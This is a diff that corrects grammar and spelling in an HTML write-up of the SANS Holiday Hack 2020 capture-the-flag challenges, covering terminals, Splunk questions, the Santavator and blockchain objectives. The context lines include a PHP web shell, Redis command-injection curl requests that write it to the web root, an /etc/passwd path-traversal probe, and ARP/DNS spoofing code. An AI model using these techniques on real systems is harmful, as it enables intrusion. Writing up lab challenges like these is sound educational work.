@@ -287,7 +287,7 @@ if (!doNotTrack) {
 <p>For a few days during my holiday break I set out to play the challenge this year. I&rsquo;ve dabbled with Holiday Hack challenges in the past, however, this was the first one I actually finished (thanks COVID?). Anyways, this post is basically <strong>one big spoiler</strong>, but details on the challenges and how I solved &lsquo;em follows.</p>
 <p>To help navigate this monster, I suggest you check out the table of contents on the side.</p>
 <h2 id="intro">intro</h2>
-<p>Knowing the format of Holiday Hack and how to actually get to challenges is something I struggled with in the past. Having a character that bounces around a map is confusing, and unexpected at first. But, once you figured out which bits are important (your location, your badge and the challenges themselves), you should be good to go. <a href="https://www.coengoedegebure.com/getting-started-with-sans-holiday-hack-challenge-2020/">This</a> post is a good &ldquo;getting started&rdquo; guide to demystify some of that stuff for the 2020 challenges.</p>
+<p>Knowing the format of Holiday Hack and how to actually get to challenges is something I struggled with in the past. Having a character that bounces around a map is confusing, and unexpected at first. But, once you figure out which bits are important (your location, your badge and the challenges themselves), you should be good to go. <a href="https://www.coengoedegebure.com/getting-started-with-sans-holiday-hack-challenge-2020/">This</a> post is a good &ldquo;getting started&rdquo; guide to demystify some of that stuff for the 2020 challenges.</p>
 <p>Embrace the format, it&rsquo;s part of the fun.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/hackerfam.png"/> <figcaption>
@@ -297,9 +297,9 @@ if (!doNotTrack) {
 
 <p>I won’t repeat all of the logistics, instead, I want to dive straight into the challenges themselves. Basically, there were two &ldquo;types&rdquo; of challenges. The main objectives and the &ldquo;terminal&rdquo; challenges. Terminal challenges were typically easier (but definitely fun and challenging too!), and once completed the Elf next to the terminal would provide some hints and other info for objectives.</p>
 <h2 id="format">format</h2>
-<p>I never really found myself in a position where I did not have an idea of what I had to do. Very clear direction on the challenges were given in the form of hints from Elves, solving terminal challenges or by viewing the <em>Hints</em> section in your badge.</p>
+<p>I never really found myself in a position where I did not have an idea of what I had to do. Very clear directions on the challenges were given in the form of hints from Elves, solving terminal challenges or by viewing the <em>Hints</em> section in your badge.</p>
 <h2 id="terminals">terminals</h2>
-<p>Once completed, terminal challanges would reveal vital hints for the main objectives, so clearing them was really useful and fun!</p>
+<p>Once completed, terminal challenges would reveal vital hints for the main objectives, so clearing them was really useful and fun!</p>
 <h3 id="unescape-tmux">unescape tmux</h3>
 <p><em>Pepper Minstix</em> stands next to a terminal called &ldquo;Unescape Tmux&rdquo; in the entry area. Something about watching a bird, I don&rsquo;t know.</p>
 <figure>
@@ -392,7 +392,7 @@ sleep <span style="color:#f60">2</span>
         </figcaption>
 </figure>
 
-<p>This challenge actually consisted of three challenges in total; door, lights and vending machine and Bushy was happy to give hints for each after completing one. Editable versions of each challange lived in the <code>lab/</code> directory, making it possible to fiddle with them and not break the &ldquo;real&rdquo; ones.</p>
+<p>This challenge actually consisted of three challenges in total; door, lights and vending machine and Bushy was happy to give hints for each after completing one. Editable versions of each challenge lived in the <code>lab/</code> directory, making it possible to fiddle with them and not break the &ldquo;real&rdquo; ones.</p>
 <h4 id="door">door</h4>
 <p>The most important of the challenges, but also the easiest one, we start by just running the <code>door</code> program and see how it behaves.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">elf@aaa8cc7e08d2 ~ $ ./door 
@@ -662,7 +662,7 @@ drwx------ 1 www-data www-data 4096 Dec 31 10:54 html
 player@f9292a141ef5:/var/www$ 
 </code></pre></div><p>Ah! We can&rsquo;t see what&rsquo;s inside <code>/var/www/html</code>, but redis running as root shouldn&rsquo;t have any problems with that. That gives us a plan of attack. Write a webshell to somewhere in <code>/var/www/html</code> using the Redis command injection we have, and then execute commands as <code>www-data</code> (the webserver is running as this user) to read the <code>index.php</code> file they mention.</p>
 <p>Writing a web shell via Redis is done by configuring Redis (via the command injection) where to save database snapshots, adding a new key containing a web shell, then saving a snapshot. This results in the web shell being written to the path we specified.</p>
-<p>We know the webserver is configured to use PHP, so a small PHP webshell like this should be fine.</p>
+<p>We know the web server is configured to use PHP, so a small PHP webshell like this should be fine.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?=<span style="color:#87ceeb">`$_GET[1]`</span><span style="color:#e5e5e5">?&gt;</span>
 </code></pre></div><p>Let&rsquo;s write the shell to <code>/var/www/html/c.php</code>. Remember the hint we got when we cURL&rsquo;d the <code>maintenance.php</code> file stating that commands should be separated by commas. I lost some time by not reading that properly.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=&#34;config,set,dir,/var/www/html&#34;
@@ -849,7 +849,7 @@ Your answer is correct!
         </figcaption>
 </figure>
 
-<p>Starting a game had you see two squares, one where your fortresses were and another where you have to guess where you enemies fortresses are.</p>
+<p>Starting a game you see two squares, one where your fortresses are and another where you have to guess where your enemies' fortresses are.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/terminal_snow_ball_player.png"/> <figcaption>
             <h4>snowball fight player fortresses</h4>
@@ -901,7 +901,7 @@ myprng = mt19937(<span style="color:#f60">0</span>)
         </figcaption>
 </figure>
 
-<p>Knowing where the enemies fortresses are with the predicted seed, we can now play a surgically accurate game on impossible.</p>
+<p>Knowing where the enemy&rsquo;s fortresses are with the predicted seed, we can now play a surgically accurate game on impossible.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/terminal_snow_ball_impossible_predict.png"/> <figcaption>
             <h4>snowball fight easy game with predicted seed</h4>
@@ -910,7 +910,7 @@ myprng = mt19937(<span style="color:#f60">0</span>)
 
 <p>Solving this challenge provides hints for the later blockchain challenges, 11a &amp; 11b.</p>
 <h2 id="objectives">objectives</h2>
-<p>Many of the objectives required hints from some of the <a href="#terminals">terminal</a> challenges first. I did not really have a strategy other than walking around and clicking on terminals as I saw them. As I went through them, I chose to do the main objectives that were available next to them as well. At first, only the first 5 main objectives were visible until you unlock the door in Santas workshop to impersonate him.</p>
+<p>Many of the objectives required hints from some of the <a href="#terminals">terminal</a> challenges first. I didn&rsquo;t really have a strategy other than walking around and clicking on terminals as I saw them. As I went through them, I chose to do the main objectives that were available next to them as well. At first, only the first 5 main objectives were visible until you unlocked the door in Santas workshop to impersonate him.</p>
 <h3 id="1---uncover-santas-gift-list">1 - uncover santas gift list</h3>
 <p>When you first login you start off in a staging area. The first objective on your badge reads:</p>
 <blockquote>
@@ -1035,7 +1035,7 @@ North Pole: The Frostiest Place on Earth
 
 <p>Opening the challenge we get a link to download an executable at <a href="https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe">https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe</a>.</p>
 <p>I took this file and ran it on a Windows VM, which installed what looked like an Electron application and presented me with the password screen the challenge referred to. The hint we get from the terminal challenge tells us that it is possible to extract JavaScript source code for electron apps using a utility called <a href="https://www.npmjs.com/package/asar">asar</a>. More specifically, this utility can read the archive format for <code>.asar</code> files, and we have to get that from the Point-of-Sale application.</p>
-<p>To get the file, open task manager after running santa-shop. Browse to the &ldquo;Details&rdquo; tab and search for the <code>santa-shop.exe</code> process. Right click any of the few and hit &ldquo;Open file location&rdquo;.</p>
+<p>To get the file, open the task manager after running santa-shop. Browse to the &ldquo;Details&rdquo; tab and search for the <code>santa-shop.exe</code> process. Right click any of the few and hit &ldquo;Open file location&rdquo;.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/pos_pass_file_loc.png"/> <figcaption>
             <h4>open file location dialog in windows task manager</h4>
@@ -1057,7 +1057,7 @@ North Pole: The Frostiest Place on Earth
 <blockquote>
 <p>Talk to Pepper Minstix in the entryway to get some hints about the Santavator.</p>
 </blockquote>
-<p>Pepper was our <a href="#unescape-tmux">unescape tmux</a> challenge elf, so after you finished that you&rsquo;d get some hints on how to operate the Santavator. Basically, you&rsquo;d pickup stuff lying around, including an all-important <em>elevator key</em>, pop open the button&rsquo;s panel and &ldquo;tweak&rdquo; the internals to make the buttons usable. The idea was to get the light particle source split up so that each coloured section would get enough particles to light up the section.</p>
+<p>Pepper was our <a href="#unescape-tmux">unescape tmux</a> challenge elf, so after you finished that you&rsquo;d get some hints on how to operate the Santavator. Basically, you&rsquo;d pick up stuff lying around, including an all-important <em>elevator key</em>, pop open the button&rsquo;s panel and &ldquo;tweak&rdquo; the internals to make the buttons usable. The idea was to get the light particle source split up so that each coloured section would get enough particles to light up the section.</p>
 <p>Unfortunately I have no idea where I picked most of the stuff I got such as nuts, lights and the key, but, you should be able to spot them lying around on the ground on the map pretty easily. Just walk around a bit and explore the rooms.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/player_items.png"/> <figcaption>
@@ -1142,7 +1142,7 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
         </figcaption>
 </figure>
 
-<p>At this stage you would have unlocked the rest of the objectives on your badge, and you could now do challenges such as the Splunk challenge that only Santa could do. Paying close attention to the narrative, many Elf&rsquo;s mentioned that Santa was acting strange. At this point is clear that it was because of the ability we have to impersonate him.</p>
+<p>At this stage you would have unlocked the rest of the objectives on your badge, and you could now do challenges such as the Splunk challenge that only Santa could do. Paying close attention to the narrative, many Elf&rsquo;s mentioned that Santa was acting strange. At this point it is clear that it was because of the ability we have to impersonate him.</p>
 <h3 id="6---splunk-challenge">6 - splunk challenge</h3>
 <blockquote>
 <p>Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?</p>
@@ -1155,14 +1155,14 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
         </figcaption>
 </figure>
 
-<p>Clicking the computer opened a new tab with a Splunk Web UI here: <a href="https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc">https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc</a>. Trying to browse to that URL without logging into the Kringlecon 3 challenge site would have your redirected to a login page, fwiw.</p>
+<p>Clicking the computer opened a new tab with a Splunk Web UI here: <a href="https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc">https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc</a>. Trying to browse to that URL without logging into the Kringlecon 3 challenge site would have you redirected to a login page, fwiw.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/splunk_web_ui.png"/> <figcaption>
             <h4>splunk webui with the kringlesoc app open</h4>
         </figcaption>
 </figure>
 
-<p>For this challenge you had to answer a few questions (seen on the right) based on an Advesary Simulation that had been run using the <a href="https://github.com/splunk/attack_range">Splunk Attack Range</a>. Conversations in the KringleSOC chats reveal these details to help you understand where the data is coming from. Once you are ready to start, the chat with &ldquo;Alice Bluebird&rdquo; would guide you through the rest of it.</p>
+<p>For this challenge you had to answer a few questions (seen on the right) based on an Adversary Simulation that had been run using the <a href="https://github.com/splunk/attack_range">Splunk Attack Range</a>. Conversations in the KringleSOC chats reveal these details to help you understand where the data is coming from. Once you are ready to start, the chat with &ldquo;Alice Bluebird'' would guide you through the rest of it.</p>
 <p>Let&rsquo;s tackle those questions and the Search Processing Language (SPL) I used to solve them.</p>
 <blockquote>
 <ol>
@@ -1220,7 +1220,7 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
 </blockquote>
 <p>This one was tricky for me as it took me a really long time to discover which parts were important from both the Github profile, the relevant project and the correct data in splunk. Anyways, we get a vague hint about someone&rsquo;s Github profile, asking us to find the PID of the first relevant process created for the technique.</p>
 <p>Checking out the users Github profile, we find one project that <em>may</em> be relevant (based purely on eliminating the other projects they had). <a href="https://github.com/frgnca/AudioDeviceCmdlets">AudioDeviceCmdlets</a>. Searching for <code>AudioDeviceCmdlets</code> in the Atomic Red Team repository we find T1123, which we also have an index for in splunk. So, this must be the relevant TTP.</p>
-<p>We&rsquo;re told that Event Code 1 is the event type were interested in, and that is something Sysmon will give us, so we can add that to our search. At this point I had <code>index=t1123-win EventCode=1 *audio*</code> for my search. This narrowed the possibilities down to two events for me.</p>
+<p>We&rsquo;re told that Event Code 1 is the event type we&rsquo;re interested in, and that is something Sysmon will give us, so we can add that to our search. At this point I had <code>index=t1123-win EventCode=1 *audio*</code> for my search. This narrowed the possibilities down to two events for me.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/splunk_question_5.png"/> <figcaption>
             <h4>splunk question 5 search &amp; result</h4>
@@ -1275,7 +1275,7 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
 <p><strong>For this challenge you had to be playing as Santa (accessible after you completed <a href="#5---open-hid-lock">objective 5</a>)</strong></p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/sleigh_can_d_bus_santa.png"/> <figcaption>
-            <h4>santa by the sliegh in the netwars room</h4>
+            <h4>santa by the sleigh in the netwars room</h4>
         </figcaption>
 </figure>
 
@@ -1328,7 +1328,7 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
         </figcaption>
 </figure>
 
-<p>I opened the image URL in a new tab, which revealed the full URL as <a href="https://tag-generator.kringlecastle.com/image?id=a5471902-34bb-461c-80d7-2620c3d1bc66.png">https://tag-generator.kringlecastle.com/image?id=a5471902-34bb-461c-80d7-2620c3d1bc66.png</a>. At this stage I decided to fire up Burp Suite to test if the <code>id</code> field may be vulnerable to local file inclusion using and <code>id</code> of <code>../../../../etc/passwd</code>, which it was.</p>
+<p>I opened the image URL in a new tab, which revealed the full URL as <a href="https://tag-generator.kringlecastle.com/image?id=a5471902-34bb-461c-80d7-2620c3d1bc66.png">https://tag-generator.kringlecastle.com/image?id=a5471902-34bb-461c-80d7-2620c3d1bc66.png</a>. At this stage I decided to fire up Burp Suite to test if the <code>id</code> field may be vulnerable to local file inclusion using an <code>id</code> of <code>../../../../etc/passwd</code>, which it was.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/broken_tag_generator_lfi.png"/> <figcaption>
             <h4>broken tag generator lfi</h4>
@@ -1467,7 +1467,7 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 4 packets captured
 4 packets received by filter
 0 packets dropped by kernel
-</code></pre></div><p>Neat, so the host were interested in is asking (every second?) who has 10.6.6.53! ARP being a layer 2 protocol means we&rsquo;d be interested in the MAC addresses used to be able to craft a legitimate response using the provided script. Another way to view network traffic is to use <code>tshark</code>. In this case it would print out the relevant MAC addresses too.</p>
+</code></pre></div><p>Neat, so the host we&rsquo;re interested in is asking (every second?) who has 10.6.6.53! ARP being a layer 2 protocol means we&rsquo;d be interested in the MAC addresses used to be able to craft a legitimate response using the provided script. Another way to view network traffic is to use <code>tshark</code>. In this case it would print out the relevant MAC addresses too.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">guest@b0fe959ddcac:~/scripts$ tshark -n
 Capturing on &#39;eth0&#39;
     1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
@@ -1642,7 +1642,7 @@ Domain Name System (query)
             Address: 10.6.0.3
     [Retransmitted request. Original request in: 6]
     [Retransmission: True]
-</code></pre></div><p>Hah! I was responding with another query type packet, even though my response had answers! Derp. that helped me focus in on where to look (the transport was fine, the packet itself was not), which finally lead me to the <code>aa</code> and <code>qr</code> fields! <code>aa</code> specifies that this is an authoritative answer (not necessarily required), but more importantly <code>qr</code> is a bitfield that specifies if this packet is a <em>query</em> (<code>0</code>), or a <em>response</em> (<code>1</code>). My completed script was therefore:</p>
+</code></pre></div><p>Hah! I was responding with another query type packet, even though my response had answers! Derp. that helped me focus in on where to look (the transport was fine, the packet itself was not), which finally led me to the <code>aa</code> and <code>qr</code> fields! <code>aa</code> specifies that this is an authoritative answer (not necessarily required), but more importantly <code>qr</code> is a bitfield that specifies if this packet is a <em>query</em> (<code>0</code>), or a <em>response</em> (<code>1</code>). My completed script was therefore:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0">#!/usr/bin/python3</span>
 <span style="color:#f00">from</span> scapy.all <span style="color:#f00">import</span> *
 <span style="color:#f00">import</span> netifaces <span style="color:#f00">as</span> ni
@@ -1795,7 +1795,7 @@ dpkg-deb --build <span style="color:#eedd82">$TPATH</span>/work/
 
 <p>Clicking on the naughty/nice list on the desk will take you to <a href="https://download.holidayhackchallenge.com/2020/blockchain.dat">https://download.holidayhackchallenge.com/2020/blockchain.dat</a> to download a file called <code>blockchain.dat</code>. Save this one. Next, the conversation with Tinsel Upatree will reveal a set of tools you could use to interact with that file, located here: <a href="https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip">https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip</a>.</p>
 <p>The &ldquo;EducationPack&rdquo; archive contains a simple <code>Dockerfile</code> to setup <code>pycryptodome</code>, as well as certificates that will allow you to interact with the blockchain data file you previously downloaded. As <code>pycryptodome</code> is a simple python dependency, I just installed it in a virtual environment and worked from there. Nothing stops you from building and using the docker container though.</p>
-<p>The more important file though is <code>naughty_nice.py</code>. The beginning of the file contains a very large comment with a summary of how a blockchain works in general, together with some usage information about the two classes in the file; <code>Block</code> and <code>Chain</code>. The scripts&rsquo; entry point also has some example usage where a new <code>Chain</code> is created, and some blocks (including a genesis block) is added and finally verified.</p>
+<p>The more important file though is <code>naughty_nice.py</code>. The beginning of the file contains a very large comment with a summary of how a blockchain works in general, together with some usage information about the two classes in the file; <code>Block</code> and <code>Chain</code>. The scripts&rsquo; entry point also has some example usage where a new <code>Chain</code> is created, and some blocks (including a genesis block) are added and finally verified.</p>
 <p>Now before we dive into the nonce prediction part of this objective, let&rsquo;s get familiar with the two new classes we have to work with. I created a new file, <code>main.py</code> and imported the <code>Block</code> and <code>Chain</code> classes from the <code>naughty_nice</code> module. Next, I loaded the <code>blockchain.dat</code> file we got and tried to verify the chain using the <code>verify_chain()</code> function.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f00">import</span> hashlib
 <span style="color:#f00">from</span> Crypto.PublicKey <span style="color:#f00">import</span> RSA
